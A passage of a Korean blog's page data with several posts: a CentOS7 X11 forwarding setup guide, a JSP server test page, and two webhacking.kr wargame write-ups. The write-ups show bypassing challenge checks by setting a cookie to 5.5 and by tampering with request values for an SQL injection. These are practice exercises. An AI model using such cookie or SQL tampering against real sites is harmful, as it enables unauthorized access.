install</h1>\n<p>CentOS쪽으로 붙을 클라이언트 측(Windows)에서 <a href=\"https://sourceforge.net/projects/xming/\">Xming을 설치</a>해 준다.\r\n기본설정대로 설치해 준다.</p>\n<p>설치 이후 설정을 해 주어야 한다. Xming을 설치하면 XLaunch라는 것이 생긴다. 이걸 실행하면 아래같은 창이 뜬다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 510px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 77.57575757575758%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADdUlEQVR42n2U2W8bRRzH98/ieEDqC+KFlwgJqbQgQOIFgSpBJYhohZDCS4XK1QcQFSKQBJSmOWhiJySxSZyjiWuTy7HjI7bXx9rew3t5bcf9oJmoQRWIkb7amdnffH/Xd0ZRyyXqdY2KqtJqtRCj3+/T7Xbp9XoSYu53Onj+f8HHD7ry3MIfEZRisUgmkyGVOqZQKJBKpdB1g8FgIIkF4WDwmP8bjUqZhxtrxDY3UcSBWq1GuVxG0zTKZVVCq2s0m00qlRpBEPyLRPgQTsXw8of8/PUI09O/oniui+u6eJ4nv72gQ6/bQez3uz79bgfbtp+C77kMeh0G4n/g4zttfLtJJLKKIgwsy8I0LXzXIXl8ykwkwUYyw8RSkrn1I1ynfWFjty0Ocip3Qwl+Wt5nInLAyqMs/f4Zi0tLKPl8nmw2R6FQRNeqjC0lCccS6M0WD4+q3IseoWl1crk8xVKZXuCxEDti6N3veGZ4lk/Ht/h+IUk3CFhdXUVRVZVSsUSxWKKtNxgNxbn5YxQ36CNakSlpVKp1WeOyWqHnOzzYPuH54WleHZnk0o37fPLLJpz1iESjKKJurudiO46sV2QnxbVb9/lqdIU7Y6vMr+3juY6sr7DpeA5rewXe/jLMtW8WePOLee7MxWHQJxQKoTQaDUSUIp3At5mKHDL03iTXR37nxTdG+fzuGo5toKoVSqUyHbdNaDPNy+9Pcf3WMi+98xsffbsCnBEOL6JUq1VOT0/J5vL0Og6j84949vI4E3MJXrg6zge3V7AMjZ2dOLGNLdRigenoIc+9Nsbo1C6XXh/jrc/mhZAIhcMoQi4CjpSMR2gjxZUbM1wZnuWV61P8MLOL7zm0WrqEa1tE4ydcvTnL5Y9nGfpwitsTG/C4fx5hPl+QHTw5yWIYBs1GA93QsR2Ltm3JuWmaUjZPINaGadC2Tay2ia635PVcXFxEqdXqiLQFTMtC1FQQW1ZbQlxDwzSlBs9hPu3AtNB1/R9CsSEIhJF4HC6ikMYGbcuUYhZzw9AvbIUjQSTWAkGnc95lKQfbxnEcCVUtk8vlyOeynBSr8lbspfOky02qTQOtXkM8KJp2nonILJ0+lgHICMVP0eUniMd3WY/FiK2vE91O8ODPXWaW1lnaPiB5mOFg7y+2trfY39+Xr1QikWB5eZnj4zSTk5P8DXRicisKR8izAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/08aa88c995dd3c7fe84c1e1576341442/c9b55/0.webp 165w,\n/static/08aa88c995dd3c7fe84c1e1576341442/f2908/0.webp 330w,\n/static/08aa88c995dd3c7fe84c1e1576341442/b7235/0.webp 510w\"\n              sizes=\"(max-width: 510px) 100vw, 510px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/08aa88c995dd3c7fe84c1e1576341442/04c57/0.png 165w,\n/static/08aa88c995dd3c7fe84c1e1576341442/d9ecf/0.png 330w,\n/static/08aa88c995dd3c7fe84c1e1576341442/0abdd/0.png 510w\"\n            sizes=\"(max-width: 510px) 100vw, 510px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/08aa88c995dd3c7fe84c1e1576341442/0abdd/0.png\"\n            alt=\"XLaunch\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>계속 다음-다음-마침 눌러주면 된다.</p>\n<p>그리고 Xming을 실행시켜 준다.</p>\n<h1>4. putty X11</h1>\n<p>putty를 실행하면 왼쪽 탭에서\r\nConnection - SSH - X11에 들어가 Enable X11 forwarding에 체크해 준다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 452px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 97.57575757575758%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADGklEQVR42qVT2W7TUBD1d/ID/BgSvPDCAyAQm0pVaBPiON4dL7Gdxq73PUubg2bShlJVCEGk0Z1c3zl37jlnhC+fX8F1HYRhCMe2YVkW5tYcZVmh73t0XYe2bTkoH4YB7e0e/S+KAlVV8Up7gixP4XkemqZFXdfIsgx5XjDY0Pe8bjYbbLcU22Mc9g75er1msJubGwi27cIPApiWBdOaM2hRlAjDJbKsRJqm0DQVqqJCns0wlSTMZjIM3YCmqphMRNiOgyRJuFagDrC/gWmYyPMS9NvtdojjGK4jwzB1jMdjWHMbaZpgtVphuVwiiqJjvlpFfDE/Oc9zpEnC3KVpxoBdNyCKAhj6E4jiC2iaB8syoWkaTHOOoiyZs7IsD1EUTBU1J2RZjixNoaoqfD9AVdV8m2078H0D0+kP/mYYJpIk5W8kAnHY33JM0TTNocO6bnC920HXDMiygrbr+TbHcTCTFFxcjCDLMsajMabiFKZpQVFk/JhMuAF6MjmEKCLVhaqu0bUdHxTFKYZhzYBEtCiK+H72DefnFww8Go2gaQZs24YkzaCqGizT5FoCJLUF4qOpG+ZnsfCZQ1KMnhytIi52XRdBEHAnpmFg4QfsR3oq7SmKwhqwyiQEiaJrOq6S9Ag4n9tMOB2iIN4oiKu6rkBikjBhEEDXdaaIvgld37NpyWeU/+rQZiAqvCumuJ/fTQkB0cpPpjEiUUzzoOJDwN/s8Ujcv4hoEEiZvusgSRLKqn4U8G/iCEje2Wy2SLOUHX9flL/p8K7LI2DTtofpaFvousojFcXxvwNSh/v9HllWQJI8bDbXyPPsPzpsGuz3QJ6HWIbPALQYhi0b9Uj6AwH+zGF3++RuDs99is02xO4auEquGCinw1xwa5OyQEPeJF+Wh+5p2mhlwCSOEa9WuAwv4doRFl6Ay2UIz3VRFTnahkazQd+S1xp4UQ7NWcJYxJznaYrL8FCz7jsI51MZH05O8e7LV0wUFRNFw6fTM3w8/YaJokN3PBiuD8vzIVoLvLkw8PztV7z8PMbrcwNU//7TCT6cnEGzbPwE6VXSRUqUiVoAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/cf3a24eff6b04c355e16831ba3f06a8b/c9b55/1.webp 165w,\n/static/cf3a24eff6b04c355e16831ba3f06a8b/f2908/1.webp 330w,\n/static/cf3a24eff6b04c355e16831ba3f06a8b/97d89/1.webp 452w\"\n              sizes=\"(max-width: 452px) 100vw, 452px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/cf3a24eff6b04c355e16831ba3f06a8b/04c57/1.png 165w,\n/static/cf3a24eff6b04c355e16831ba3f06a8b/d9ecf/1.png 330w,\n/static/cf3a24eff6b04c355e16831ba3f06a8b/fcb94/1.png 452w\"\n            sizes=\"(max-width: 452px) 100vw, 452px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/cf3a24eff6b04c355e16831ba3f06a8b/fcb94/1.png\"\n            alt=\"Enable X11\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>세션에 저장해두면 편하다.</p>\n<h1>5. Test</h1>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 657px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 63.03030303030304%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABaklEQVR42q2T22rCQBCGd6MoiUlMTJqkEG8UfVAvRAMKEtB38IDv4Qt4I+IBvBXUC0HwLzNtbK1Cq+3Cz8xkh29nNjtiOp1iNpthPp9jtVphuVyyFosFx/e0Xq9ZSUy5pP1+DxEWiwjDEGExRBAEsCwLruvC932YpglN05DL5a6kquqVKCeVSmE0GkE4rgPP82AXLIYlQMcpIE+xbTGYpBs6zLzJECHEjfr9PgRV5fk+PO8FdsFG8EpV5vlUXdehaioMQ+fKKKbvUoq7wMFgQPY9kFJCSuXDSiiKwvrqUx51U6lUUC6XUSqVUK1WuSPaGw6Hn8CfRHdEtl6v43w+43A4YLvdglaj0eC98Xj8e2A6nWbb6/UYQtDT6cR+u91+HhjHMUM2mw12ux37zWbzeWCn02HIZDIBveE/t9ztdvF9tVqtx4HJT4miCMfj8TIpdI+1Wu1xYKJMJgPDMC5TQ342m719h/8hmpQ3lF+0rIYP7h4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/84e98ffa2f95442408824cb8e924c264/c9b55/2.webp 165w,\n/static/84e98ffa2f95442408824cb8e924c264/f2908/2.webp 330w,\n/static/84e98ffa2f95442408824cb8e924c264/b9f96/2.webp 657w\"\n              sizes=\"(max-width: 657px) 100vw, 657px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/84e98ffa2f95442408824cb8e924c264/04c57/2.png 165w,\n/static/84e98ffa2f95442408824cb8e924c264/d9ecf/2.png 330w,\n/static/84e98ffa2f95442408824cb8e924c264/a1253/2.png 657w\"\n            sizes=\"(max-width: 657px) 100vw, 657px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/84e98ffa2f95442408824cb8e924c264/a1253/2.png\"\n            alt=\"xclock\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>xclock 명령어로 테스트할 수 있다.</p>","categories":["misc","setting"],"date":"December 26, 2019","description":"","id":"49790ca4-15b8-5a86-9dbc-5aed29e28351","keywords":["centos","xwindow","x11"],"slug":"/CentOS7-X11-forwarding/","title":"CentOS7에서 X11 forwarding 설정(X Window 설치)","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":null},"body":"<p><img src=\"./images/0.PNG\" alt=\"03\"></p>\n<p>네모로직 게임처럼 생긴 문제이다. 칸을 채워 제출해 보았다.</p>\n<p><img src=\"./images/1.PNG\" alt=\"03\"></p>\n<p><img src=\"./images/2.PNG\" alt=\"clear\"></p>\n<div class=\"gatsby-highlight\" data-language=\"url\"><pre class=\"language-url\"><code class=\"language-url\"><span class=\"token scheme\">https<span class=\"token scheme-delimiter\">:</span></span><span class=\"token authority\"><span class=\"token authority-delimiter\">//</span><span class=\"token host\">webhacking.kr</span></span><span class=\"token path\"><span class=\"token path-separator\">/</span>challenge<span class=\"token path-separator\">/</span>web-03<span class=\"token path-separator\">/</span>index.php</span><span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">_1</span>=<span class=\"token value\">1</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_2</span>=<span class=\"token value\">0</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_3</span>=<span class=\"token value\">1</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_4</span>=<span class=\"token value\">0</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_5</span>=<span class=\"token value\">1</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_6</span>=<span class=\"token value\">0</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_7</span>=<span class=\"token value\">0</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_8</span>=<span class=\"token value\">0</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_9</span>=<span class=\"token value\">0</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_10</span>=<span class=\"token value\">0</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_11</span>=<span class=\"token value\">0</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_12</span>=<span class=\"token value\">1</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_13</span>=<span class=\"token value\">1</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_14</span>=<span class=\"token value\">1</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_15</span>=<span class=\"token value\">0</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_16</span>=<span class=\"token value\">0</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_17</span>=<span class=\"token value\">1</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_18</span>=<span class=\"token value\">0</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_19</span>=<span class=\"token value\">1</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_20</span>=<span class=\"token value\">0</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_21</span>=<span class=\"token value\">1</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_22</span>=<span class=\"token value\">1</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_23</span>=<span class=\"token value\">1</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_24</span>=<span class=\"token value\">1</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_25</span>=<span class=\"token value\">1</span></span><span class=\"token pair-delimiter\">&amp;</span><span class=\"token pair\"><span class=\"token key\">_answer</span>=<span class=\"token value\">1010100000011100101011111</span></span></span></code></pre></div>\n<p>s01va라고 제출했더니 아래와 같은 화면이 뜬다.</p>\n<p><img src=\"./images/3.PNG\" alt=\"log\"></p>\n<p>이 세션을 웹 디버거로 캡쳐해서 분석했다.</p>\n<p><img src=\"./images/4.PNG\" alt=\"fiddler\"></p>\n<p>answer값과 id값을 &#x26;로 묶어서 보내고 있는 것을 볼 수 있다. 양쪽 값을 모두 참으로 만들어 보았다.</p>\n<p><img src=\"./images/5.PNG\" alt=\"webdebugger1\"></p>\n<p>빈 name에는 admin을 집어넣었다(아무 값이나 상관없음)</p>\n<p><img src=\"./images/6.PNG\" alt=\"result\"></p>\n<p>3번을 풀었다. 일반적인 SQL injection 문제.</p>","categories":["writeup","wargame","webhacking"],"date":"December 26, 2019","description":"리뉴얼 기념 정주행","id":"df1d01ce-4f46-5c9a-9940-9fd999cee80d","keywords":["webhacking.kr","cookie","sql-injection"],"slug":"/WriteUp-Webhackingkr-03/","title":"Webhacking.kr 3번","readingTime":{"text":"1 min read"}},{"banner":{"alt":null,"caption":null,"src":null},"body":"<p>리뉴얼 기념!</p>\n<p><img src=\"./images/0.PNG\" alt=\"gate-01\"></p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\r\n  <span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"../../config.php\"</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'view-source'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token function\">view_source</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\r\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_lv'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n    <span class=\"token function\">SetCookie</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"user_lv\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">86400</span><span class=\"token operator\">*</span><span class=\"token number\">30</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"/challenge/web-01/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;meta http-equiv=refresh content=0>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token punctuation\">}</span>\r\n<span class=\"token delimiter important\">?></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Challenge 1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span> <span class=\"token attr-name\">bgcolor</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>black</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>font</span> <span class=\"token attr-name\">color</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>white</span><span class=\"token punctuation\">></span></span>\r\n---------------------<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\r\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_lv'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_lv'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_lv'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">>=</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_lv'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_lv'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">></span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token function\">solve</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>level : <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_lv'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span></span>\"</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token delimiter important\">?></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span>\r\n&lt;a href=./?view-source=1>view-source<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span>\r\n</code></pre></div>\n<p>user_lv 쿠키값이 6보다 같거나 크면 안되며\r\n5보다 크면 solve된다.</p>\n<p>쿠키값을 5.5로 맞추어 주었다.</p>\n<p><img src=\"./images/1.PNG\" alt=\"user_lv cookie\"></p>\n<p>간단하게 1번문제를 풀었다.\r\n<img src=\"./images/2.PNG\" alt=\"pwned!\"></p>\n<p><img src=\"./images/3.PNG\" alt=\"Congratz\"></p>\n<p>※\r\n나는 웹해킹 문제를 주로 Chrome에서 풀이했다.\r\n쿠키값 조정은 <a href=\"https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?utm_source=chrome-ntp-icon\">이 확장 프로그램</a>을 주로 사용했다.</p>","categories":["writeup","wargame","webhacking"],"date":"November 21, 2019","description":"리뉴얼 기념 정주행","id":"b7b8b9f6-dcbe-5dbe-bfd5-9f66473405ba","keywords":["webhacking.kr","cookie"],"slug":"/WriteUp-Webhackingkr-01/","title":"Webhacking.kr 1번","readingTime":{"text":"1 min read"}},{"banner":{"alt":null,"caption":null,"src":null},"body":"<p>WAS 제품을 설치 후, 또는 Web Server 제품까지 설치하고 연동시킨 후 그 결과를 확인하기 위해 테스트용 웹 어플리케이션이 필요하다.</p>\n<p>IDE: Eclipse</p>\n<p>Dynamic Web Project로 생성한다.</p>\n<p><img src=\"./images/0.PNG\" alt=\"Eclipse:Dynamic Web Project\"></p>\n<p>프로젝트 이름을 설정하고 Finish</p>\n<p><img src=\"./images/1.PNG\" alt=\"Eclipse:Dynamic Web Project\"></p>\n<p>jsp파일을 WebContent 안에 새로 만들어 준다.</p>\n<p><img src=\"./images/2.PNG\" alt=\"Eclipse:Dynamic Web Project\"></p>\n<p>만약 tomcat이 연결되어 있지 않으면 첫줄부터</p>\n<p>The superclass \"javax.servlet.http.HttpServlet\" was not found on the Java Build Path</p>\n<p>같은 오류가 뜬다. 먼저 <a href=\"https://tomcat.apache.org/download-80.cgi\">톰캣 페이지</a>에서 톰캣을 설치한다.\r\n이후 이클립스에서 프로젝트 우클릭 -> Properties를 선택하고 아래 캡쳐에서 톰캣을 추가해 준다.</p>\n<p><img src=\"./images/3.PNG\" alt=\"Eclipse:Dynamic Web Project\"></p>\n<p>아래는 test.jsp 코드이다.</p>\n<div class=\"gatsby-highlight\" data-language=\"jsp\"><pre class=\"language-jsp\"><code class=\"language-jsp\">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=EUC-KR&quot;\r\n\tpageEncoding=&quot;EUC-KR&quot;%&gt;\r\n&lt;%@ page import=&quot;java.net.*, java.io.*, java.util.*, java.text.*&quot;%&gt;\r\n&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;\r\n&lt;html&gt;\r\n&lt;head&gt;\r\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=EUC-KR&quot;&gt;\r\n&lt;title&gt;WAS TEST PAGE&lt;/title&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n\t&lt;%\r\n\t\t// page name\r\n\t\tout.println(&quot;:: WAS TEST PAGE ::&quot;);\r\n\t\tout.println(&quot;&lt;br&gt;&lt;br&gt;&quot;);\r\n\r\n\t\tInetAddress Address = InetAddress.getLocalHost();\r\n\t\t// ip\r\n\t\tString ipaddr = Address.getHostAddress();\r\n\t\tout.println(&quot;IP: &quot; + ipaddr);\r\n\t\tout.println(&quot;&lt;br&gt;&quot;);\r\n\t\t// host name\r\n\t\tString hostname = Address.getHostName();\r\n\t\tout.println(&quot;Host Name: &quot; + hostname);\r\n\t\tout.println(&quot;&lt;br&gt;&lt;br&gt;&quot;);\r\n\r\n\t\tURL url = application.getResource(&quot;/test.jsp&quot;);\r\n\t\t// jsp path\r\n\t\tString jsppath = url.getPath();\r\n\t\tout.println(&quot;JSP Path: &quot; + jsppath);\r\n\t\tout.println(&quot;&lt;br&gt;&quot;);\r\n\t\t// WAS info\r\n\t\tString wasinfo = application.getServerInfo();\r\n\t\tout.println(&quot;WAS: &quot; + wasinfo);\r\n\t\tout.println(&quot;&lt;br&gt;&quot;);\r\n\t\t// servlet,jsp version\r\n\t\tString jspv = application.getMajorVersion() + &quot;.&quot; + application.getMinorVersion();\r\n\t\tout.println(&quot;Servlet/JSP version: &quot; + jspv);\r\n\t\tout.println(&quot;&lt;br&gt;&lt;br&gt;&quot;);\r\n\r\n\t\t// date,time\r\n\t\tSimpleDateFormat dtformat = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);\r\n\t\tString datetime = dtformat.format(new java.util.Date());\r\n\t\tout.println(&quot;Current System Time: &quot; + datetime);\r\n\t\t// session id\r\n\t\tout.println(&quot;Session ID: &quot; + session.getId());\r\n\t\tout.println(&quot;&lt;br&gt;&quot;);\r\n\t%&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;</code></pre></div>\n<p><img src=\"./images/4.PNG\" alt=\"test.jsp view\"></p>\n<p>아래는 보기 편하게 하기 위해서 table을 입힌 코드이다.</p>\n<div class=\"gatsby-highlight\" data-language=\"jsp\"><pre class=\"language-jsp\"><code class=\"language-jsp\">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=EUC-KR&quot;\r\n\tpageEncoding=&quot;EUC-KR&quot;%&gt;\r\n&lt;%@ page import=&quot;java.net.*, java.io.*, java.util.*, java.text.*&quot;%&gt;\r\n&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;\r\n&lt;html&gt;\r\n&lt;head&gt;\r\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=EUC-KR&quot;&gt;\r\n&lt;title&gt;WAS TEST PAGE&lt;/title&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n\t&lt;%\r\n\t\t// page name\r\n\t\tout.println(&quot;:: WAS TEST PAGE ::&quot;);\r\n\t\tout.println(&quot;&lt;br&gt;&quot;);\r\n\t\t\r\n\t\tout.println(&quot;&lt;table border=\\&quot;0\\&quot; cellpadding=\\&quot;2\\&quot;&quot;);\r\n\t\tInetAddress Address = InetAddress.getLocalHost();\r\n\t\t// ip\r\n\t\tString ipaddr = Address.getHostAddress();\r\n\t\tout.println(&quot;&lt;tr&gt;&quot;);\r\n\t\tout.println(&quot;&lt;td bgcolor=\\&quot;#F8E0E6\\&quot;&gt;IP&lt;/td&gt;&quot;);\r\n\t\tout.println(&quot;&lt;td&gt;&quot; + ipaddr + 